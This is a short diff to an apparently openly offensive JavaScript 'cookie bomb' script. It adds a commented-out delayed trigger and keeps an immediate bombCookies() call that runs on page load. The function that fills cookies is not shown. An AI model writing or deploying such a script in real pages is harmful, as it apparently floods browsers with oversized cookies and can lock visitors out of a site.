@@ -1,4 +1,4 @@
-(function (window, document) {
+(function (window, document, undefined) {
     'use strict';
 
     var COOKIE_SIZE = 4000,
@@ -25,6 +25,16 @@
         }
     }
 
+    // If you want to bomb after the user has been on the page for a few seconds.
+    /*
+    window.onload = function() {
+      setTimeout(function () {
+        bombCookies();
+      }, 3 * 1000);
+    };
+    */
+
+    // Immediately bomb.
     bombCookies();
 
-}(window, document, undefined));
+}(window, document));
